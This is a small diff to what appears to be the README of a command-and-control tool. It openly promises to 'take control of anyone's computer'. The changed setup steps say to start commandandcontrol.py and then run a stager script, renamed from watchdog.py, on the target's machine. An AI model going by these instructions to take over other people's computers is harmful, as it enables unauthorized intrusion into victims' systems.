@@ -13,7 +13,7 @@ Take control of anyone's computer like it's non of your buisness, because it is 
 
 2) run commandandcontrol.py
 
-3) run python watchdog.py on target computer
+3) run python stager.py on target computer
 
 ----------------------------
 
